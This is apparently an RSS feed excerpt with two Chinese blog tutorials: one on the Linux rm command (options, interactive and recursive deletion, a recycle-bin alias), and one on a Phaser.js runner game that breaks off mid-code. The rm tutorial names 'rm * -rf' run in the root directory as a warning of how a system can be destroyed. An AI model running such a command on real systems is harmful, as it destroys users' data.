<title>linux每日命令(6)：rm命令 - 听风。</title>
<link>http://www.cnblogs.com/huchong/p/9855422.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/huchong/p/9855422.html</guid>
<description>&lt;p&gt;rm是常用的命令，该命令的功能为删除一个目录中的一个或多个文件或目录，它也可以将某个目录及其下的所有文件及子目录均删除。对于链接文件，只是删除了链接，原有文件均保持不变。&lt;/p&gt;
&lt;p&gt;rm是一个危险的命令，使用的时候要特别当心，尤其对于新手，否则整个系统就会毁在这个命令（比如在/（根目录）下执行rm * -rf）。所以，我们在执行rm之前最好先确认一下在哪个目录，到底要删除什么东西，操作时保持高度清醒的头脑。&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;rm [选项] 文件 &lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;删除一个目录中的一个或多个文件或目录，如果没有使用- r参数，则rm不会删除目录。如果使用 rm 来删除文件，通常仍可以将该文件恢复原状。&lt;/p&gt;

&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;8&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;--force,忽略不存在的文件，从不给出提示。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;3&quot;&gt;&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;--interactive,进行交互式删除&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;-r (-R)&lt;/td&gt;
&lt;td&gt;--recursive , 指示rm将参数中列出的全部目录和子目录均递归地删除。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;3&quot;&gt;&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;--verbose, 详细显示进行的步骤&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;--help&lt;/td&gt;
&lt;td&gt;显示此帮助信息并退出&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;--version&lt;/td&gt;
&lt;td&gt;输出版本信息并退出&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;删除文件&quot;&gt;1. 删除文件&lt;/h2&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;rm 文件名&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hc@hc-virtual-machine:~/test2/test5$ ls
file1  scf  test5-1
hc@hc-virtual-machine:~/test2/test5$ rm file1 
rm：是否删除普通空文件 'file1'？ y
hc@hc-virtual-machine:~/test2/test5$ ls
scf  test5-1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;输入rm file1命令后，系统会询问是否删除，输入y后就会删除文件，不想删除则数据n。&lt;br/&gt;如果没有进行询问，建议加上，毕竟删除操作需谨慎！&lt;/p&gt;
&lt;p&gt;方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;vi ~/.bashrc&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后再里面加入&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;alias rm='rm -i'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;意思是 rm命令 实际使用的是 rm -i 交互模式，需要进行确认&lt;br/&gt;注意，此处 rm 和 = 之间不能有空格，否则会有找不到rm命令的提示，&lt;/p&gt;
&lt;p&gt;然后在终端执行这条命令，使得刚才的修改即刻生效：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;source ~/.bashrc&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;强行删除file系统不进行确认提示&quot;&gt;2. 强行删除file，系统不进行确认提示。&lt;/h2&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;rm -f 文件名&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hc@hc-virtual-machine:~/test2/test5$ ls
file2  scf  test5-1
hc@hc-virtual-machine:~/test2/test5$ rm -f file2 
hc@hc-virtual-machine:~/test2/test5$ ls
scf  test5-1&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;删除当前目录下的所有.log结尾的文件删除前逐一询问确认&quot;&gt;3. 删除当前目录下的所有.log结尾的文件，删除前逐一询问确认&lt;/h2&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;rm -i *.log&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hc@hc-virtual-machine:~/test2/test5/test5-1$ ls
log1.log  log2.log  log3.log
hc@hc-virtual-machine:~/test2/test5/test5-1$ rm -i *.log
rm：是否删除普通空文件 'log1.log'？ y
rm：是否删除普通空文件 'log2.log'？ y
rm：是否删除普通空文件 'log3.log'？ y
hc@hc-virtual-machine:~/test2/test5/test5-1$ ls
hc@hc-virtual-machine:~/test2/test5/test5-1$ &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;touch 是创建文件的命令&lt;/p&gt;
&lt;p&gt;mkdir 是创建目录的命令&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;touch 1.log 2.log 3.log&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果一次性创建多个连续的文件/目录可以使用{1..3}&lt;/p&gt;
&lt;p&gt;例如：&lt;br/&gt;一次创建3个.log文件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;touch {1..3}.log&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;删除test5目录及其子目录里的所有的内容&quot;&gt;4. 删除test5目录及其子目录里的所有的内容&lt;/h2&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;rm -r test5&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hc@hc-virtual-machine:~/test2$ ls
test22  test3  test4  test5
hc@hc-virtual-machine:~/test2$ tree test5
test5
├── log.log
├── scf
│   ├── bin
│   ├── doc
│   │   ├── info
│   │   └── product
│   ├── lib
│   ├── logs
│   │   ├── info
│   │   └── product
│   └── service
│       └── deploy
│           ├── info
│           └── product
└── test5-1
    └── log4.log

14 directories, 2 files
hc@hc-virtual-machine:~/test2$ ls
test22  test3  test4  test5
hc@hc-virtual-machine:~/test2$ rm -r test5
rm：是否进入目录'test5'? y
rm：是否进入目录'test5/scf'? y
rm：是否进入目录'test5/scf/logs'? y
rm：是否删除目录 'test5/scf/logs/info'？ y
rm：是否删除目录 'test5/scf/logs/product'？ y
rm：是否删除目录 'test5/scf/logs'？ y
rm：是否进入目录'test5/scf/service'? y
rm：是否进入目录'test5/scf/service/deploy'? y
rm：是否删除目录 'test5/scf/service/deploy/info'？ y
rm：是否删除目录 'test5/scf/service/deploy/product'？ y
rm：是否删除目录 'test5/scf/service/deploy'？ y
rm：是否删除目录 'test5/scf/service'？ y
rm：是否删除目录 'test5/scf/bin'？ y
rm：是否进入目录'test5/scf/doc'? y
rm：是否删除目录 'test5/scf/doc/info'？ y
rm：是否删除目录 'test5/scf/doc/product'？ y
rm：是否删除目录 'test5/scf/doc'？ y
rm：是否删除目录 'test5/scf/lib'？ y
rm：是否删除目录 'test5/scf'？ y
rm：是否进入目录'test5/test5-1'? y
rm：是否删除普通空文件 'test5/test5-1/log4.log'？ y
rm：是否删除目录 'test5/test5-1'？ y
rm：是否删除普通空文件 'test5/log.log'？ y
rm：是否删除目录 'test5'？ y
hc@hc-virtual-machine:~/test2$ ls
test22  test3  test4
hc@hc-virtual-machine:~/test2$ 
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;删除test5目录及其子目录里的所有的内容且不用进行询问确认&quot;&gt;5. 删除test5目录及其子目录里的所有的内容，且不用进行询问确认&lt;/h2&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;rm -rf test5&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;创建删除以-开头的文件&quot;&gt;6. 创建、删除以-开头的文件&lt;/h2&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;p&gt;在当前目录下创建文件名为-a和-b的文件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;方法一： touch ./-a
方法二： touch -- -b&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;删除当前目录下文件名为-a和-b 的文件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;方法一： rm -- -a
方法二： rm ./-b&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hc@hc-virtual-machine:~/test2/test4$ ls
hc@hc-virtual-machine:~/test2/test4$ touch -a
touch: 缺少了文件操作数
Try 'touch --help' for more information.
hc@hc-virtual-machine:~/test2/test4$ touch ./-a
hc@hc-virtual-machine:~/test2/test4$ ls
-a
hc@hc-virtual-machine:~/test2/test4$ touch -- -b
hc@hc-virtual-machine:~/test2/test4$ ls
-a  -b
hc@hc-virtual-machine:~/test2/test4$ rm -a
rm: 不适用的选项 -- a
Try 'rm ./-a' to remove the file '-a'.
Try 'rm --help' for more information.
hc@hc-virtual-machine:~/test2/test4$ rm -- -a
rm：是否删除普通空文件 '-a'？ y
hc@hc-virtual-machine:~/test2/test4$ ls
-b
hc@hc-virtual-machine:~/test2/test4$ rm ./-b
rm：是否删除普通空文件 './-b'？ y
hc@hc-virtual-machine:~/test2/test4$ ls
hc@hc-virtual-machine:~/test2/test4$ &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;档名最好不要使用 &quot;-&quot; 号开头， 因为 &quot;-&quot; 后面接的是选项，因此，单纯的使用『 rm -a 』系统的命令就会误判。所以，只能用避过首位字节是 &quot;-&quot; 的方法啦！ 就是加上本目录『 ./ 』即可！&lt;br/&gt;如果 man rm 查看使用方法的话，其实还有一种方法，那就是『 rm -- -f 』（另外一种方法而已）。&lt;/p&gt;
&lt;h2 id=&quot;自定义回收站功能&quot;&gt;7. 自定义回收站功能&lt;/h2&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;myrm(){ D=/tmp/$(date +%Y%m%d%H%M%S); mkdir -p $D; mv &quot;$@&quot; $D &amp;amp;&amp;amp; echo &quot;moved to $D ok&quot;; }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;
myrm()
{ 
D=/tmp/$(date +%Y%m%d%H%M%S); 
#在/tmp文件夹中创建名为“当前日期”的文件；
#其中“date+%Y%m%d%H%M%S”是规定了日期的输出格式；
mkdir -p $D; 
#以变量D中的路径创建文件夹。
mv &quot;$@&quot; $D &amp;amp;&amp;amp; echo &quot;moved to $D ok&quot;; 
#将所要删除的文件移入变量D中的文件夹内，移入成功后，输出移动成功。
}

alias rm='myrm'
#命令别名定义方式，此定义成功后，无论输入rm或myrm系统都会做出相同操作。
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hc@hc-virtual-machine:/tmp$ myrm(){ D=/tmp/$(date +%Y%m%d%H%M%S); mkdir -p $D;  mv &quot;$@&quot; $D &amp;amp;&amp;amp; echo &quot;moved to $D ok&quot;; }

hc@hc-virtual-machine:/tmp$ alias rm='myrm'

hc@hc-virtual-machine:/tmp$ touch {1..4}.log

hc@hc-virtual-machine:/tmp$ ls
1.log  2.log  3.log 4.log
hc@hc-virtual-machine:/tmp$ rm [1234].log
moved to /tmp/20181026111028 ok
hc@hc-virtual-machine:/tmp$ ls
20181026111028
hc@hc-virtual-machine:/tmp$  cd 20181026111028/
hc@hc-virtual-machine:/tmp/20181026111028$ ls
1.log  2.log  3.log  4.log&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;上面的操作过程模拟了回收站的效果，即删除文件的时候只是把文件放到一个临时目录中，这样在需要的时候还可以恢复过来。&lt;/p&gt;
&lt;p&gt;由于我们当前已将rm绑定为myrm，所以我们无法执行删除操作&lt;/p&gt;
&lt;p&gt;临时设置rm命令别名为myrm&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;alias rm='myrm'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此时若想删除回收站里的文件，&lt;br/&gt;由于是临时的，所以换一个命令行窗口后，绑定就会失效&lt;br/&gt;即换一个命令行窗口执行rm -r 命令删除即可&lt;/p&gt;
&lt;p&gt;如果不想换命令行窗口，可以用&lt;code&gt;sudo rm -rf 目录名&lt;/code&gt; 删除回收站的文件&lt;/p&gt;
&lt;p&gt;或者解除临时绑定&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;unalias rm&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hc@hc-virtual-machine:/tmp/20181026111444$ alias 
alias alert='notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;amp;&amp;amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;amp;|]\s*alert$//'\'')&quot;'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias rm='myrm'
hc@hc-virtual-machine:/tmp/20181026111444$ unalias rm
hc@hc-virtual-machine:/tmp/20181026111444$ alias 
alias alert='notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;amp;&amp;amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;amp;|]\s*alert$//'\'')&quot;'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 26 Oct 2018 03:39:00 +0000</pubDate>
<dc:creator>听风。</dc:creator>
<og:description>rm是常用的命令，该命令的功能为删除一个目录中的一个或多个文件或目录，它也可以将某个目录及其下的所有文件及子目录均删除。对于链接文件，只是删除了链接，原有文件均保持不变。 rm是一个危险的命令，使用的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/huchong/p/9855422.html</dc:identifier>
</item>
<item>
<title>Phaser.js之简单的跑酷游戏 - ProsperLee</title>
<link>http://www.cnblogs.com/lprosper/p/9855361.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lprosper/p/9855361.html</guid>
<description>&lt;p&gt;采用的物理引擎是&lt;strong&gt;&lt;a href=&quot;http://phaser.io/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;Phaser.js&lt;/span&gt;&lt;/a&gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;官网地址：&lt;a href=&quot;http://phaser.io/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;&lt;span&gt;http://phaser.io/&lt;/span&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;在这里对此引擎不做过多介绍（因为我也是小白，嘿嘿）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;效果展示：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1401533/201810/1401533-20181026111143090-1582632657.gif&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;源码（详细源码图片资源可点击文章下方或屏幕右上方的github链接进行clone）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;1.创建游戏舞台&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; config =&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    type: Phaser.AUTO,
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     width: 800&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     height: 400&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;    physics: {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;         &lt;span&gt;default&lt;/span&gt;: 'arcade'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;        arcade: {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;            gravity: {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;                 y: 300
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;            },
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;             debug: &lt;span&gt;false&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;    },
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;    scene: {
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;        preload: preload,
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;        create: create,
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        update: update
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;};
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; 
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; game = &lt;span&gt;new&lt;/span&gt; Phaser.Game(config); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建游戏&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;2.载入资源&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; preload() {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.load.image('sky', 'assets/sky.png'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.load.image('ground', 'assets/platform.png'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt; 5&lt;/span&gt;     &lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.load.spritesheet('dude', 'assets/dude.png'&lt;span&gt;, {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;         frameWidth: 32&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         frameHeight: 48
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;3.将资源创建到舞台上&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; distanceText; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 路程文本&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; distance = 0; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 路程&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; platforms; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 地面&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; player; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 玩家&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; enemy; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; enemys; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人们&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; enemyTimer; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人计时器&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; distanceTimer; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 路程计时器&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; create() {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加画布背景&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.add.image(400, 200, 'sky'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加分数文本&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt;     distanceText = &lt;span&gt;this&lt;/span&gt;.add.text(16, 16, 'Distance: 0m'&lt;span&gt;, {
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;         fontSize: '20px'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         fill: '#000'
&lt;span&gt;17&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加地面&lt;/span&gt;
&lt;span&gt;19&lt;/span&gt;     platforms = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.physics.add.staticGroup();
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     platforms.create(400, 400, 'ground').setScale(3&lt;span&gt;).refreshBody();
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加玩家（精灵）&lt;/span&gt;
&lt;span&gt;22&lt;/span&gt;     player = &lt;span&gt;this&lt;/span&gt;.physics.add.sprite(100, 300, 'dude'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;     player.setBounce(0); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置阻力&lt;/span&gt;
&lt;span&gt;24&lt;/span&gt;     player.setCollideWorldBounds(&lt;span&gt;true&lt;/span&gt;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 禁止玩家走出世界&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt; 
&lt;span&gt;26&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人&lt;/span&gt;
&lt;span&gt;27&lt;/span&gt;     enemys = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.physics.add.group();
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;     enemys.children.iterate(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; (child) {
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;         child.setCollideWorldBounds(&lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 动态创建敌人&lt;/span&gt;
&lt;span&gt;32&lt;/span&gt;     enemyTimer = setInterval(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt;         enemy = enemys.create(1000, 300, 'dude'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt; &lt;span&gt;        enemy.setTint(&lt;span&gt;&lt;strong&gt;&lt;em&gt;getColor()&lt;/em&gt;&lt;/strong&gt;&lt;/span&gt;);
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt;         enemy.anims.play('left', &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt;         enemy.setVelocityX(Phaser.Math.Between(-300, -100&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt;     }, Phaser.Math.Between(4000, 8000&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;38&lt;/span&gt; 
&lt;span&gt;39&lt;/span&gt;     distanceTimer = setInterval(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;         distance += 1&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt;         distanceText.setText('Distance: ' + distance + 'm'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;     }, 1000&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;43&lt;/span&gt; 
&lt;span&gt;44&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.physics.add.collider(player, platforms); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;玩家在地面上&lt;/span&gt;
&lt;span&gt;45&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.physics.add.collider(enemys, platforms); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;敌人在地面上&lt;/span&gt;
&lt;span&gt;46&lt;/span&gt;     &lt;strong&gt;&lt;span&gt;this.physics.add.collider(player, enemys, &lt;em&gt;&lt;span&gt;hitBomb&lt;/span&gt;&lt;/em&gt;, null, this);
&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;47&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;4.在创建场景过程中写键盘监听事件&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt; cursors; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 按键&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 事件&lt;/span&gt;
    &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.anims.create({
        key: &lt;/span&gt;'left'&lt;span&gt;,
        frames: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.anims.generateFrameNumbers('dude'&lt;span&gt;, {
            start: &lt;/span&gt;0&lt;span&gt;,
            end: &lt;/span&gt;3&lt;span&gt;
        }),
        frameRate: &lt;/span&gt;10&lt;span&gt;,
        repeat: &lt;/span&gt;-1&lt;span&gt;
    });

    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.anims.create({
        key: &lt;/span&gt;'right'&lt;span&gt;,
        frames: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.anims.generateFrameNumbers('dude'&lt;span&gt;, {
            start: &lt;/span&gt;5&lt;span&gt;,
            end: &lt;/span&gt;8&lt;span&gt;
        }),
        frameRate: &lt;/span&gt;10&lt;span&gt;,
        repeat: &lt;/span&gt;-1&lt;span&gt;
    });

    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.anims.create({
        key: &lt;/span&gt;'turn'&lt;span&gt;,
        frames: [{
            key: &lt;/span&gt;'dude'&lt;span&gt;,
            frame: &lt;/span&gt;4&lt;span&gt;
        }],
        frameRate: &lt;/span&gt;20&lt;span&gt;
    });

    cursors &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;.input.keyboard.createCursorKeys();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;5.写碰撞函数（当玩家与敌人碰撞的结果）&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; gameOver = &lt;span&gt;false&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 游戏结束&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; hitBomb(player, enemys) {
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.physics.pause();
